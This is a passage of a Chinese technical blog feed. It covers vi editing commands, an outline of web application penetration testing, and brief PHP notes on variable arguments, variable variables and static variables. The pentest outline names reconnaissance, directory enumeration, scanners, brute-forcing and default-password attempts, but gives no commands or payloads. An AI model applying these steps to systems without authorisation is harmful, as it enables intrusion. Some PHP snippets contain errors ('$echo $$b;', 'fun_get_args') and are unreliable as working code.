连用，例如：<code>ggVG</code> 能够选中所有内容</li></ul><h3 id="4-4-撤销和恢复撤销"><a href="#4-4-撤销和恢复撤销" class="headerlink" title="4.4 撤销和恢复撤销"></a>4.4 撤销和恢复撤销</h3><ul><li>在学习编辑命令之前，先要知道怎样撤销之前一次 <strong>错误的</strong> 编辑动作！</li></ul><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">英文</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">u</td><td style="text-align:center">undo</td><td>撤销上次命令</td></tr><tr><td style="text-align:center">CTRL + r</td><td style="text-align:center">redo</td><td>恢复撤销的命令</td></tr></tbody></table><h3 id="4-5-删除文本"><a href="#4-5-删除文本" class="headerlink" title="4.5 删除文本"></a>4.5 删除文本</h3><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">英文</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">x</td><td style="text-align:center">cut</td><td>删除光标所在字符，或者选中文字</td></tr><tr><td style="text-align:center">d(移动命令)</td><td style="text-align:center">delete</td><td>删除移动命令对应的内容</td></tr><tr><td style="text-align:center">dd</td><td style="text-align:center">delete</td><td>删除光标所在行，可以 ndd 复制多行</td></tr><tr><td style="text-align:center">D</td><td style="text-align:center">delete</td><td>删除至行尾</td></tr></tbody></table><blockquote><p>提示：如果使用 <strong>可视模式</strong> 已经选中了一段文本，那么无论使用 <code>d</code> 还是 <code>x</code>，都可以删除选中文本</p></blockquote><ul><li>删除命令可以和 <strong>移动命令</strong> 连用，以下是常见的组合命令：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* dw        # 从光标位置删除到单词末尾</span><br><span class="line">* d0        # 从光标位置删除到一行的起始位置</span><br><span class="line">* d&#125;        # 从光标位置删除到段落结尾</span><br><span class="line">* ndd       # 从光标位置向下连续删除 n 行</span><br><span class="line">* d代码行G   # 从光标所在行 删除到 指定代码行 之间的所有代码</span><br><span class="line">* d&apos;a       # 从光标所在行 删除到 标记a 之间的所有代码</span><br></pre></td></tr></table></figure><h3 id="4-6-复制、粘贴"><a href="#4-6-复制、粘贴" class="headerlink" title="4.6 复制、粘贴"></a>4.6 复制、粘贴</h3><ul><li><code>vi</code> 中提供有一个 <strong>被复制文本的缓冲区</strong><ul><li><strong>复制</strong> 命令会将选中的文字保存在缓冲区 </li><li><strong>删除</strong> 命令删除的文字会被保存在缓冲区</li><li>在需要的位置，使用 <strong>粘贴</strong> 命令可以将缓冲区的文字插入到光标所在位置</li></ul></li></ul><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">英文</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">y(移动命令)</td><td style="text-align:center">copy</td><td>复制</td></tr><tr><td style="text-align:center">yy</td><td style="text-align:center">copy</td><td>复制一行，可以 nyy 复制多行</td></tr><tr><td style="text-align:center">p</td><td style="text-align:center">paste</td><td>粘贴</td></tr></tbody></table><p><strong>提示</strong></p><ul><li>命令 <code>d</code>、<code>x</code> 类似于图形界面的 <strong>剪切操作</strong> —— <code>CTRL + X</code></li><li>命令 <code>y</code> 类似于图形界面的 <strong>复制操作</strong> —— <code>CTRL + C</code></li><li>命令 <code>p</code> 类似于图形界面的 <strong>粘贴操作</strong> —— <code>CTRL + V</code></li><li><code>vi</code> 中的 <strong>文本缓冲区同样只有一个</strong>，如果后续做过 <strong>复制、剪切</strong> 操作，之前缓冲区中的内容会被替换</li></ul><p><strong>注意</strong></p><ul><li><code>vi</code> 中的 <strong>文本缓冲区</strong> 和系统的 <strong>剪贴板</strong> 不是同一个</li><li>所以在其他软件中使用 <code>CTRL + C</code> 复制的内容，不能在 <code>vi</code> 中通过 <code>P</code> 命令粘贴</li><li>可以在 <strong>编辑模式</strong> 下使用 <strong>鼠标右键粘贴</strong></li></ul><h3 id="4-7-替换"><a href="#4-7-替换" class="headerlink" title="4.7 替换"></a>4.7 替换</h3><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">英文</th><th>功能</th><th>工作模式</th></tr></thead><tbody><tr><td style="text-align:center">r</td><td style="text-align:center">replace</td><td>替换当前字符</td><td>命令模式</td></tr><tr><td style="text-align:center">R</td><td style="text-align:center">replace</td><td>替换当前行光标后的字符</td><td>替换模式</td></tr></tbody></table><ul><li><code>R</code> 命令可以进入 <strong>替换模式</strong>，替换完成后，按下 <code>ESC</code> 可以回到 <strong>命令模式</strong></li><li><strong>替换命令</strong> 的作用就是不用进入 <strong>编辑模式</strong>，对文件进行 <strong>轻量级的修改</strong></li></ul><h3 id="4-8-缩排和重复执行"><a href="#4-8-缩排和重复执行" class="headerlink" title="4.8 缩排和重复执行"></a>4.8 缩排和重复执行</h3><table><thead><tr><th style="text-align:center">命令</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">&gt;&gt;</td><td>向右增加缩进</td></tr><tr><td style="text-align:center">&lt;&lt;</td><td>向左减少缩进</td></tr><tr><td style="text-align:center">.</td><td>重复上次命令</td></tr></tbody></table><ul><li><strong>缩排命令</strong> 在开发程序时，<strong>统一增加代码的缩进</strong> 比较有用！<ul><li>一次性 <strong>在选中代码前增加 4 个空格</strong>，就叫做 <strong>增加缩进</strong></li><li>一次性 <strong>在选中代码前删除 4 个空格</strong>，就叫做 <strong>减少缩进</strong></li></ul></li><li>在 <strong>可视模式</strong> 下，缩排命令只需要使用 <strong>一个</strong> <code>&gt;</code> 或者 <code>&lt;</code> </li></ul><blockquote><p>在程序中，<strong>缩进</strong> 通常用来表示代码的归属关系</p><ul><li>前面空格越少，代码的级别越高</li><li>前面空格越多，代码的级别越低</li></ul></blockquote><h3 id="4-9-查找"><a href="#4-9-查找" class="headerlink" title="4.9 查找"></a>4.9 查找</h3><h4 id="常规查找"><a href="#常规查找" class="headerlink" title="常规查找"></a>常规查找</h4><table><thead><tr><th style="text-align:center">命令</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">/str</td><td>查找 str</td></tr></tbody></table><ul><li>查找到指定内容之后，使用 <code>Next</code> 查找下一个出现的位置：<ul><li><code>n</code>: 查找下一个</li><li><code>N</code>: 查找上一个</li></ul></li><li>如果不想看到高亮显示，可以随便查找一个文件中不存在的内容即可</li></ul><h4 id="单词快速匹配"><a href="#单词快速匹配" class="headerlink" title="单词快速匹配"></a>单词快速匹配</h4><table><thead><tr><th style="text-align:center">命令</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">*</td><td>向后查找当前光标所在单词</td></tr><tr><td style="text-align:center">#</td><td>向前查找当前光标所在单词</td></tr></tbody></table><ul><li>在开发中，通过单词快速匹配，可以快速看到这个单词在其他什么位置使用过</li></ul><h3 id="4-10-查找并替换"><a href="#4-10-查找并替换" class="headerlink" title="4.10 查找并替换"></a>4.10 查找并替换</h3><ul><li>在 <code>vi</code> 中查找和替换命令需要在 <strong>末行模式</strong> 下执行</li><li>记忆命令格式：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:%s///g</span><br></pre></td></tr></table></figure><h4 id="1-全局替换"><a href="#1-全局替换" class="headerlink" title="1) 全局替换"></a>1) 全局替换</h4><ul><li><strong>一次性</strong>替换文件中的 <strong>所有出现的旧文本</strong></li><li>命令格式如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:%s/旧文本/新文本/g</span><br></pre></td></tr></table></figure><h4 id="2-可视区域替换"><a href="#2-可视区域替换" class="headerlink" title="2) 可视区域替换"></a>2) 可视区域替换</h4><ul><li><strong>先选中</strong> 要替换文字的 <strong>范围</strong></li><li>命令格式如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:s/旧文本/新文本/g</span><br></pre></td></tr></table></figure><h4 id="3-确认替换"><a href="#3-确认替换" class="headerlink" title="3) 确认替换"></a>3) 确认替换</h4><ul><li>如果把末尾的 <code>g</code> 改成 <code>gc</code> 在替换的时候，会有提示！<strong>推荐使用！</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:%s/旧文本/新文本/gc</span><br></pre></td></tr></table></figure><ol><li><code>y</code> - <code>yes</code> 替换</li><li><code>n</code> - <code>no</code> 不替换</li><li><code>a</code> - <code>all</code> 替换所有</li><li><code>q</code> - <code>quit</code> 退出替换</li><li><code>l</code> - <code>last</code> 最后一个，并把光标移动到行首</li><li><code>^E</code> 向下滚屏</li><li><code>^Y</code> 向上滚屏</li></ol><h3 id="4-11-插入命令"><a href="#4-11-插入命令" class="headerlink" title="4.11 插入命令"></a>4.11 插入命令</h3><ul><li>在 <code>vi</code> 中除了常用的 <code>i</code> 进入 <strong>编辑模式</strong> 外，还提供了以下命令同样可以进入编辑模式：</li></ul><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">英文</th><th>功能</th><th style="text-align:center">常用</th></tr></thead><tbody><tr><td style="text-align:center">i</td><td style="text-align:center">insert</td><td>在当前字符前插入文本</td><td style="text-align:center">常用</td></tr><tr><td style="text-align:center">I</td><td style="text-align:center">insert</td><td>在行首插入文本</td><td style="text-align:center">较常用</td></tr><tr><td style="text-align:center">a</td><td style="text-align:center">append</td><td>在当前字符后添加文本</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">A</td><td style="text-align:center">append</td><td>在行末添加文本</td><td style="text-align:center">较常用</td></tr><tr><td style="text-align:center">o</td><td style="text-align:center"></td><td>在当前行后面插入一空行</td><td style="text-align:center">常用</td></tr><tr><td style="text-align:center">O</td><td style="text-align:center"></td><td>在当前行前面插入一空行</td><td style="text-align:center">常用</td></tr></tbody></table><p><img src="https://i.imgur.com/GwvwdGM.png" alt="插入命令"></p><h4 id="演练-1-——-编辑命令和数字连用"><a href="#演练-1-——-编辑命令和数字连用" class="headerlink" title="演练 1 —— 编辑命令和数字连用"></a>演练 1 —— 编辑命令和数字连用</h4><ul><li>在开发中，可能会遇到连续输入 <code>N</code> 个同样的字符</li></ul><blockquote><p>在 <code>Python</code> 中有简单的方法，但是其他语言中通常需要自己输入</p></blockquote><ul><li>例如：<code>**********</code> 连续 10 个星号</li></ul><p>要实现这个效果可以在 <strong>命令模式</strong> 下</p><ol><li>输入 <code>10</code>，表示要重复 10 次</li><li>输入 <code>i</code> 进入 <strong>编辑模式</strong></li><li>输入 <code>*</code> 也就是重复的文字</li><li>按下 <code>ESC</code> 返回到 <strong>命令模式</strong>，返回之后 <code>vi</code> 就会把第 <code>2、3</code> 两步的操作重复 <code>10</code> 次</li></ol><blockquote><p>提示：正常开发时，在 <strong>进入编辑模式之前，不要按数字</strong></p></blockquote><h4 id="演练-2-——-利用-可视块-给多行代码增加注释"><a href="#演练-2-——-利用-可视块-给多行代码增加注释" class="headerlink" title="演练 2 —— 利用 可视块 给多行代码增加注释"></a>演练 2 —— 利用 可视块 给多行代码增加注释</h4><ul><li>在开发中，可能会遇到一次性给多行代码 <strong>增加注释</strong> 的情况</li></ul><blockquote><p>在 <code>Python</code> 中，要给代码增加注释，可以在代码前增加一个 <code>#</code></p></blockquote><p>要实现这个效果可以在 <strong>命令模式</strong> 下</p><ol><li>移动到要添加注释的 <strong>第 1 行代码</strong>，按 <code>^</code> 来到行首</li><li>按 <code>CTRL + v</code> 进入 <strong>可视块</strong> 模式</li><li>使用 <code>j</code> 向下连续选中要添加的代码行</li><li>输入 <code>I</code> 进入 <strong>编辑模式</strong>，并在 <strong>行首插入</strong>，注意：一定要使用 <strong>I</strong></li><li>输入 <code>#</code> 也就是注释符号</li><li>按下 <code>ESC</code> 返回到 <strong>命令模式</strong>，返回之后 <code>vi</code> 会在之前选中的每一行代码 <strong>前</strong> 插入 <code>#</code></li></ol><h2 id="05-分屏命令"><a href="#05-分屏命令" class="headerlink" title="05. 分屏命令"></a>05. 分屏命令</h2><ul><li>属于 <code>vi</code> 的高级命令 —— 可以 <strong>同时编辑和查看多个文件</strong></li></ul><h3 id="5-1-末行命令扩展"><a href="#5-1-末行命令扩展" class="headerlink" title="5.1 末行命令扩展"></a>5.1 末行命令扩展</h3><p><strong>末行命令</strong> 主要是针对文件进行操作的：<strong>保存</strong>、<strong>退出</strong>、<strong>保存&amp;退出</strong>、<strong>搜索&amp;替换</strong>、<strong>另存</strong>、<strong>新建</strong>、<strong>浏览文件</strong></p><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">英文</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">:e .</td><td style="text-align:center">edit</td><td>会打开内置的文件浏览器，浏览要当前目录下的文件</td></tr><tr><td style="text-align:center">:n 文件名</td><td style="text-align:center">new</td><td>新建文件</td></tr><tr><td style="text-align:center">:w 文件名</td><td style="text-align:center">write</td><td>另存为，但是仍然编辑当前文件，并不会切换文件</td></tr></tbody></table><blockquote><p>提示：切换文件之前，必须保证当前这个文件已经被保存！</p></blockquote><ul><li>已经学习过的 <strong>末行命令</strong>：</li></ul><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">英文</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">:w</td><td style="text-align:center">write</td><td>保存</td></tr><tr><td style="text-align:center">:q</td><td style="text-align:center">quit</td><td>退出，如果没有保存，不允许退出</td></tr><tr><td style="text-align:center">:q!</td><td style="text-align:center">quit</td><td>强行退出，不保存退出</td></tr><tr><td style="text-align:center">:wq</td><td style="text-align:center">write &amp; quit</td><td>保存并退出</td></tr><tr><td style="text-align:center">:x</td><td style="text-align:center"></td><td>保存并退出</td></tr><tr><td style="text-align:center">:%s///gc</td><td style="text-align:center"></td><td>确认搜索并替换</td></tr></tbody></table><blockquote><p>在实际开发中，可以使用 <code>w</code> 命令 <strong>阶段性的备份代码</strong></p></blockquote><h3 id="5-2-分屏命令"><a href="#5-2-分屏命令" class="headerlink" title="5.2 分屏命令"></a>5.2 分屏命令</h3><ul><li>使用 <strong>分屏命令</strong>，可以 <strong>同时编辑和查看多个文件</strong></li></ul><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">英文</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">:sp [文件名]</td><td style="text-align:center">split</td><td>横向增加分屏</td></tr><tr><td style="text-align:center">:vsp [文件名]</td><td style="text-align:center">vertical split</td><td>纵向增加分屏</td></tr></tbody></table><h4 id="1-切换分屏窗口"><a href="#1-切换分屏窗口" class="headerlink" title="1) 切换分屏窗口"></a>1) 切换分屏窗口</h4><blockquote><p>分屏窗口都是基于 <code>CTRL + W</code> 这个快捷键的，<code>w</code> 对应的英文单词是 <code>window</code></p></blockquote><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">英文</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">w</td><td style="text-align:center">window</td><td>切换到下一个窗口</td></tr><tr><td style="text-align:center">r</td><td style="text-align:center">reverse</td><td>互换窗口</td></tr><tr><td style="text-align:center">c</td><td style="text-align:center">close</td><td>关闭当前窗口，但是不能关闭最后一个窗口</td></tr><tr><td style="text-align:center">q</td><td style="text-align:center">quit</td><td>退出当前窗口，如果是最后一个窗口，则关闭 vi</td></tr><tr><td style="text-align:center">o</td><td style="text-align:center">other</td><td>关闭其他窗口</td></tr></tbody></table><h4 id="2-调整窗口大小"><a href="#2-调整窗口大小" class="headerlink" title="2) 调整窗口大小"></a>2) 调整窗口大小</h4><blockquote><p>分屏窗口都是基于 <code>CTRL + W</code> 这个快捷键的，<code>w</code> 对应的英文单词是 <code>window</code></p></blockquote><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">英文</th><th>功能</th></tr></thead><tbody><tr><td style="text-align:center">+</td><td style="text-align:center"></td><td>增加窗口高度</td></tr><tr><td style="text-align:center">-</td><td style="text-align:center"></td><td>减少窗口高度</td></tr><tr><td style="text-align:center">&gt;</td><td style="text-align:center"></td><td>增加窗口宽度</td></tr><tr><td style="text-align:center">&lt;</td><td style="text-align:center"></td><td>减少窗口宽度</td></tr><tr><td style="text-align:center">=</td><td style="text-align:center"></td><td>等分窗口大小</td></tr></tbody></table><blockquote><p>调整窗口宽高的命令可以和数字连用，例如：<code>5 CTRL + W +</code> 连续 5 次增加高度</p></blockquote><h2 id="06-常用命令速查图"><a href="#06-常用命令速查图" class="headerlink" title="06. 常用命令速查图"></a>06. 常用命令速查图</h2><p><img src="https://i.imgur.com/r7c7iDL.png" alt="vim"></p><h3 id="vimrc"><a href="#vimrc" class="headerlink" title="vimrc"></a>vimrc</h3><ul><li><code>vimrc</code> 是 <code>vim</code> 的配置文件，可以设置 vim 的配置，包括：<strong>热键</strong>、<strong>配色</strong>、<strong>语法高亮</strong>、<strong>插件</strong> 等</li><li><code>Linux</code> 中 <code>vimrc</code> 有两个位置，<strong>家目录下的配置文件优先级更高</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/vim/vimrc</span><br><span class="line">~/.vimrc</span><br></pre></td></tr></table></figure><ul><li>常用的插件有：<ul><li>代码补全</li><li>代码折叠</li><li>搜索</li><li>Git 集成</li><li>……</li></ul></li><li>网上有很多高手已经配置好的针对 <code>python</code> 开发的 <code>vimrc</code> 文件，可以下载过来直接使用，或者等大家多 <code>Linux</code> 比较熟悉后，再行学习！</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;目标&quot;&gt;&lt;a href=&quot;#目标&quot; class=&quot;headerlink&quot; title=&quot;目标&quot;&gt;&lt;/a&gt;目标&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;vi&lt;/code&gt; 简介&lt;/li&gt;
&lt;li&gt;打开和新建文件&lt;/li&gt;
&lt;li&gt;三种工作模式&lt;/li&gt;
&lt;li&gt;常用命
      
    
    </summary>
    
      <category term="vi —— 终端中的编辑器" scheme="https://feng4.github.io/categories/vi-%E2%80%94%E2%80%94-%E7%BB%88%E7%AB%AF%E4%B8%AD%E7%9A%84%E7%BC%96%E8%BE%91%E5%99%A8/"/>
    
    
      <category term="vi —— 终端中的编辑器" scheme="https://feng4.github.io/tags/vi-%E2%80%94%E2%80%94-%E7%BB%88%E7%AB%AF%E4%B8%AD%E7%9A%84%E7%BC%96%E8%BE%91%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>Web应用渗透测试流程</title>
    <link href="https://feng4.github.io/2018/11/02/web%E5%BA%94%E7%94%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
    <id>https://feng4.github.io/2018/11/02/web应用渗透测试流程/</id>
    <published>2018-11-02T04:24:12.468Z</published>
    <updated>2018-11-02T15:09:01.363Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web应用渗透测试"><a href="#Web应用渗透测试" class="headerlink" title="Web应用渗透测试"></a>Web应用渗透测试</h2><p>对于web应用的测试，一般分为三个阶段：信息收集、漏洞发现以及漏洞利用。</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>在信息收集阶段，我们需要尽量多的收集关于目标web应用的各种信息，比如：脚本语言的类型、服务器的类型、目录结构、使用的开源软件、数据库类型、所有链接页面，用到的框架等。<br></p><h4 id="脚本语言的类型"><a href="#脚本语言的类型" class="headerlink" title="脚本语言的类型"></a>脚本语言的类型</h4><p>常见的脚本语言的类型包括：php、asp、aspx、jsp等。<br><br><strong>测试方法</strong><br></p><ol><li>爬取网站所有链接，查看后缀</li><li>直接访问一个不存在页面后面加不同后缀测试</li><li>查看robots.txt，查看后缀</li></ol><h4 id="服务器的类型"><a href="#服务器的类型" class="headerlink" title="服务器的类型"></a>服务器的类型</h4><p>常见的web服务器包括：apache、tomcat、iis、ngnix等<br><br><strong>测试方法</strong><br></p><ol><li>查看header，判断服务器类型</li><li>根据报错信息判断</li><li>根据默认页面判断<h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4>了解更多的目录，可能发现更多的弱点，如：目录浏览、代码泄漏等。<br><br><strong>测试方法</strong></li><li>使用字典枚举目录</li><li>使用爬虫爬取整个网站，或者使用google等搜索引擎获取</li><li>查看robots.txt是否泄漏<h4 id="使用的开源软件"><a href="#使用的开源软件" class="headerlink" title="使用的开源软件"></a>使用的开源软件</h4>我们如果知道了目标使用的开源软件，我们查找相关的软件的漏洞直接对网站进行测试。<br><br><strong>测试方法</strong><br><br>指纹识别(网上在线的指纹识别工具，例：<em>云溪指纹识别</em>)</li></ol><h4 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h4><p>对于不同的数据库，有不同的测试方法。<br><br><strong>测试方法</strong><br></p><ol><li>使用应用程序报错，查看报错信息</li><li>扫描服务器的数据库端口（没做NAT且防火墙不过滤时有效）<h4 id="所有链接页面"><a href="#所有链接页面" class="headerlink" title="所有链接页面"></a>所有链接页面</h4>这个跟前面的获取目录结构类似，但是这个不是获取网站的所有功能页面，有时候还可以获取到管理员备份的源码。<br><br><strong>测试方法</strong><br></li><li>使用字典枚举页面</li><li>使用爬虫爬取整个网站，或者使用google等搜索引擎获取</li><li>查看robots.txt是否泄漏<h4 id="用到的框架"><a href="#用到的框架" class="headerlink" title="用到的框架"></a>用到的框架</h4>很多网站都利用开源的框架来快速开发网站，所以收集网站的框架信息也是非常关键的。<br><br><strong>测试方法</strong><br><br>指纹识别<br><strong>漏洞发现</strong><br><br>在这个阶段我们在做测试的时候要对症下药，不能盲目的去扫描，首先要确定目标应用是否使用的是公开的开源软件、开源框架等，然后在做深一度的漏洞扫描。<h4 id="关于开源软件的漏洞发现"><a href="#关于开源软件的漏洞发现" class="headerlink" title="关于开源软件的漏洞发现"></a>关于开源软件的漏洞发现</h4><strong>开源软件</strong><br><br>常见的开源软件有：wordpress、phpbb、dedecms等。<br><br><strong>开源的框架</strong><br><br>常见的开源框架有：struts2、spring MVC、thinkPHP等。<br><br><strong>中间件服务器</strong><br><br>常见的中间件服务器有：jboss、tomcat、Weblogic等。<br><br><strong>数据库服务</strong><br><br>常见的数据库服务：mssql、mysql、oracle、redis、sybase、MongoDB、DB2等。<br><br><strong>对开源软件的测试方法</strong><br></li><li>通过指纹识别软件判断开源的版本信息，针对不同的版本信息去开放的漏洞数据库查找相应版本的漏洞进行测试</li><li>对于默认的后台登入页、数据库服务端口认证等入口可以进行简单的暴力破解、默认口令尝试等操作。</li><li>使用开源的漏洞发现工具对其进行漏洞扫描，如：WPScan<h4 id="关于自主开发的应用"><a href="#关于自主开发的应用" class="headerlink" title="关于自主开发的应用"></a>关于自主开发的应用</h4><strong>手动测试</strong><br>这个阶段，我们需要手工测试所有与用户交互的功能，比如：留言、登入、下单、退出、退货、付款等操作。<br><br><strong>软件扫描</strong><br><br>使用免费的软件扫描，如：appscan、wvs、netsparker、burp等<br><br><strong>漏洞利用</strong><br><br>这种方式对于有特殊过滤等操作，或者网络上没有成型的利用工具的时候可以使用，在熟练之后，自己也可以写出自己的利用工具代替手工操作，毕竟手工操作是非常累的。有时候可以结合服务器的配置问题，增加成功率。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Web应用渗透测试&quot;&gt;&lt;a href=&quot;#Web应用渗透测试&quot; class=&quot;headerlink&quot; title=&quot;Web应用渗透测试&quot;&gt;&lt;/a&gt;Web应用渗透测试&lt;/h2&gt;&lt;p&gt;对于web应用的测试，一般分为三个阶段：信息收集、漏洞发现以及漏洞利用。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://feng4.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>php可变个数参数的函数</title>
    <link href="https://feng4.github.io/2018/10/25/php%E5%8F%AF%E5%8F%98%E4%B8%AA%E6%95%B0%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%BD%E6%95%B0/"/>
    <id>https://feng4.github.io/2018/10/25/php可变个数参数的函数/</id>
    <published>2018-10-25T04:30:46.028Z</published>
    <updated>2017-12-01T06:29:36.555Z</updated>
    
    <content type="html"><![CDATA[<h4 id="php可变个数参数的函数"><a href="#php可变个数参数的函数" class="headerlink" title="php可变个数参数的函数"></a>php可变个数参数的函数</h4><h5 id="php获取可变函数参数的函数"><a href="#php获取可变函数参数的函数" class="headerlink" title="php获取可变函数参数的函数"></a>php获取可变函数参数的函数</h5><p>php取得可变函数参数，方便后面的控制。</p><p>func_num_args()返回传递给该函数参数的个数</p><p>func_get_arg($arg_num)取得指定位置的参数值，$arg_num位置index从0开始到n-1。</p><p>fun_get_args()返回包含所有参数的数组</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;php可变个数参数的函数&quot;&gt;&lt;a href=&quot;#php可变个数参数的函数&quot; class=&quot;headerlink&quot; title=&quot;php可变个数参数的函数&quot;&gt;&lt;/a&gt;php可变个数参数的函数&lt;/h4&gt;&lt;h5 id=&quot;php获取可变函数参数的函数&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="php学习" scheme="https://feng4.github.io/tags/php%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>php可变变量</title>
    <link href="https://feng4.github.io/2018/10/25/php%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F/"/>
    <id>https://feng4.github.io/2018/10/25/php可变变量/</id>
    <published>2018-10-25T04:30:46.025Z</published>
    <updated>2017-12-01T14:35:59.925Z</updated>
    
    <content type="html"><![CDATA[<h3 id="php可变变量"><a href="#php可变变量" class="headerlink" title="php可变变量"></a>php可变变量</h3><pre><code>将变量名储存到另一个变量中</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line">$a=<span class="string">"我是一个变量！"</span>;</span><br><span class="line">$b=<span class="string">'a'</span>;</span><br><span class="line">$echo $$b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><pre><code>$$b:$b里保存的是变量a，$a=&quot;我是一个变量！&quot;，所以$$b的值是&quot;我是一个变量！&quot;多学一招：变量中不但可以保存变量名，还可以保存函数名。</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;php可变变量&quot;&gt;&lt;a href=&quot;#php可变变量&quot; class=&quot;headerlink&quot; title=&quot;php可变变量&quot;&gt;&lt;/a&gt;php可变变量&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;将变量名储存到另一个变量中
&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;
      
    
    </summary>
    
    
      <category term="php学习" scheme="https://feng4.github.io/tags/php%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>php静态变量</title>
    <link href="https://feng4.github.io/2018/10/25/php%E9%9D%99%E6%80%81%E5%8F%98%E9%87%8F/"/>
    <id>https://feng4.github.io/2018/10/25/php静态变量/</id>
    <published>2018-10-25T04:30:46.020Z</published>
    <updated>2017-12-01T14:34:19.889Z</updated>
    
    <content type="html"><![CDATA[<h3 id="php静态变量"><a href="#php静态变量" class="headerlink" title="php静态变量"></a>php静态变量</h3><pre><code>Static（静态）关键字</code></pre><p>1.在函数中声明的静态变量，只在调用时声明。<br><br>2.第二次以后，一看是静态变量，就先到静态区中，看一下有没有这个变量，如果有就使用，而不去再声明。<br><br>3.静态变量 ，在同一个函数多次调用中，共享把局部变量改变为静态变量后是改变了它的存储方式，即改变了它的生存期。把全局变量改变为静态变量后是改变了它的作用域，限制了它的使用范围。<br><br>static静态变量会被放在程序的全局存储区中（即在程序的全局数据区，而不是在堆栈中分配，所以不会导致堆栈溢出），这样可以在下一次调用的时候还可以保持原来的赋值。这一点是它与堆栈变量和堆变量的区别。</p><pre><code>代码示例：</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//--------------如何理解static静态变量-----------</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/** 普通局部变量 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">local</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $loc = <span class="number">0</span>; <span class="comment">//这样，如果直接不给初值0是错误的。</span></span><br><span class="line">    ++$loc;</span><br><span class="line">    <span class="keyword">echo</span> $loc . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">local(); <span 